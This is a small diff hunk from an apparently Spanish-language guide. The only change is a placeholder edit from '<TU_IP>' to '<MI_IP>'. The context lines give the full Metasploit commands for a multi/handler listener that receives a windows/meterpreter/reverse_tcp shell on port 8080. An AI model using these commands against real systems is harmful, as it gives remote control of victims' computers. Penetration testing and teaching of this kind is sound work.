@@ -127,7 +127,7 @@ Escuchar conexión en Metasploit
 msfconsole
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
-set LHOST <TU_IP>
+set LHOST <MI_IP>
 set LPORT 8080
 exploit
 
